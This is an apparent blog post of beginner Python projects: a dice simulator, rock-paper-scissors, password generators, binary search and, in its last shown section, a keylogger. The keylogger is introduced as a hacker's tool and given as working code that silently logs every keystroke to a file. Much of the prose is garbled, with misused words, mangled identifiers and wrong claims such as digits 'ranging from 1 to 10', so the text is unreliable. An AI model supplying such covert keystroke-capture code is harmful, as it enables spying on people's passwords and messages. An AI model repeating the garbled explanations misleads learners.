I've been using Python lasted for approximately a 6 months, and my favorite things about it are its one-liners and packages. One thing I've realized is that construction projects in a programming language is the most effective method for learning it.

This blog will show you 21 python projects with code. I would recommend that you first try to build your possess solution before looking into mine because you may be able to build a better solution than I. If you are an expert in Python, you can also try these projects to brush up on your skills. Let's get started.

## 1. Dice Roll Simulator

The goal is to develop a program that simulates the roll of a die.

When the user asks, use the random module to generate a number between 1 and 6.

In this tutorial, you will learn how to create a simple dice rolling simulator using Python's random module. This script will output the dice results to the terminal. As a result, the script makes no use of an image processing module. A variable called dice is used to generate a random number between 1 and 6. The function roll the dice() is defined here to generate output based on a random value. In the script, the infinite while loop is used to roll the dice infinitely until the user types anything other than 'y'.

```python
# Import random module
import random

# Define infinite loop
while True:

    # Generate a random number between 1 and 6
    dice = random.randint(1, 6)

    # Define the function to print the output based on the dice value
    def roll_the_dice(dice):
        switcher = {
            1: "[     ]\n|  0  |\n[     ]",
            2: "[0    ]\n|     |\n[    0]",
            3: "[0    ]\n|  0  |\n[    0]",
            4: "[0   0]\n|     |\n[0   0]",
            5: "[0   0]\n|  0  |\n[0   0]",
            6: "[ 0 0 ]\n| 0 0 |\n[ 0 0 ]"

        }
        return switcher.get(dice)

    # Call the function
    print(roll_the_dice(dice))
    # Ask user for rolling the dice again
    answer = input("Do you want to roll the dice again(y/n)? : ")
    # Terminate the loop if the user type anything without 'y'
    if answer != 'y':
        exit(0)
```
### Output:
For using random integer numbers, the output of the above script will vary with each iteration of the loop. The number 5 is generated in the first iteration of the loop displayed using 5 zeros in the following output. The user then typed 'y' to continue the loop, and 4 was generated in the second iteration of the loop and displayed using zeros as before. When the user types 'n,' the script terminates.

## 2. The Game of Rock, Paper, and Scissors
The goal is to create a command-line game in which a user is given the option of choosing between rock, paper, and scissors, and if the user wins, a score is added, and when the user completes the game, the score is displayed to the user.

Hint: Compare the user choice to the computer choice, which is drawn from a list of options using the random module, and if the user wins, increase the score by one.

```python
import random
choices = ["Rock", "Paper", "Scissors"]
computer = random.choice(choices)
player = False
cpu_score = 0
player_score = 0
while True:
    player = input("Rock, Paper or  Scissors?").capitalize()
    ## Conditions of Rock,Paper and Scissors
    if player == computer:
        print("Tie!")
    elif player == "Rock":
        if computer == "Paper":
            print("You lose!", computer, "covers", player)
            cpu_score+=1
        else:
            print("You win!", player, "smashes", computer)
            player_score+=1
    elif player == "Paper":
        if computer == "Scissors":
            print("You lose!", computer, "cut", player)
            cpu_score+=1
        else:
            print("You win!", player, "covers", computer)
            player_score+=1
    elif player == "Scissors":
        if computer == "Rock":
            print("You lose...", computer, "smashes", player)
            cpu_score+=1
        else:
            print("You win!", player, "cut", computer)
            player_score+=1
    elif player=='E':
        print("Final Scores:")
        print(f"CPU:{cpu_score}")
        print(f"Plaer:{player_score}")
        break
    else:
        print("That's not a valid play. Check your spelling!")
    computer = random.choice(choices)
```

## 3. Password Generator at Random

A strong password is one that contains a combination of characters, digits, and special symbols.

Assume you want to create a random password such as: -

87t@h*ki ab23cd#$ jk percent m&l98 87t@h*ki
In Python, we can generate a random string password with letters, special characters, and digits in two ways.

Combine the three constants listed below and use them as a data source for the random.choice() function to choose random characters from.
string.ascii letters: To include a-z letters and an A-Z string. digits: A string of digits ranging from 1 to 10. To obtain special symbols, use punctuation.
Use the string.printable constant and the function choice(). String.printable contains digits, ascii letters (lowercase and uppercase letters), punctuation, and whitespace.

```python
import random
import string

# get random password pf length 8 with letters, digits, and symbols
characters = string.ascii_letters + string.digits + string.punctuation
password = ''.join(random.choice(characters) for i in range(8))
print("Random password is:", password)
```

### output:
```shell
Random password is: 6(I3goZ}
```
### Using the ```string.printable```

```python
import random
import string

password = ''.join(random.choice(string.printable) for i in range(8))
print("Random password is:", password)
```

### output:

```shell
Random password is: hY*34jj.
```
### Random password with a predetermined number of letters, digits, and symbols
Passwords must contain a certain number of digits and special symbols, which is a common use case.

Let's look at how to make a random password with at least one lowercase letter, one uppercase letter, one digit, and one special symbol.

Steps: -

First, choose the specified number of random lowercase and uppercase letters.
Then, select the number of random digits.
Then, select the number of special symbols.
Make a list of letters, digits, and special symbols.
Finally, reshuffle the list.
Convert a list to a string.

```python
import random
import string

def get_random_password():
    random_source = string.ascii_letters + string.digits + string.punctuation
    # select 1 lowercase
    password = random.choice(string.ascii_lowercase)
    # select 1 uppercase
    password += random.choice(string.ascii_uppercase)
    # select 1 digit
    password += random.choice(string.digits)
    # select 1 special symbol
    password += random.choice(string.punctuation)

    # generate other characters
    for i in range(6):
        password += random.choice(random_source)

    password_list = list(password)
    # shuffle all characters
    random.SystemRandom().shuffle(password_list)
    password = ''.join(password_list)
    return password

print("First Random Password is ", get_random_password())
# output  qX49}]Ru!(
print("Second Random Password is ", get_random_password())
# Output  3nI0.V#[T
```

## 4. Binary search

The goal of binary search is to determine whether or not a given number exists in the string.

list, sorting, and searching

Check whether it is present in the middle first, then check the front and back.

TRY IT ON YOUR OWN

```python
lst = [1,3,2,4,5,6,9,8,7,10]
lst.sort()
first=0
last=len(lst)-1
mid = (first+last)//2
item = int(input("enter the number to be search"))
found = False
while( first<=last and not found):
    mid = (first + last)//2
    if lst[mid] == item :
         print(f"found at location {mid}")
         found= True
    else:
        if item < lst[mid]:
            last = mid - 1
        else:
            first = mid + 1 
   
if found == False:
    print("Number not found")
```
## 5. create a pytohn keylogger
Today we'll work on creating a Python keylogger. Keyloggers are among the most commonly used tools in a hacker's arsenal. They are, in fact, one of the most fundamental tools and are quite simple to construct. In this module, we will learn how to create a highly effective yet precise keylogger.

### Installing Required Libraries
Before we begin, we need to install a particular library, which we can do with the pip command:
```
$ sudo pip3 install pynput
# or 
pip install pynpt
```

With that out of the way, we can get back to writing code!

Creating a Python Keylogger in 10 Lines

```python
from pynput.keyboard import Key, Listener
import logging
 
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
def on_press(key):
    logging.info(str(key))
 
with Listener(on_press=on_press) as listener :
    listener.join()
```
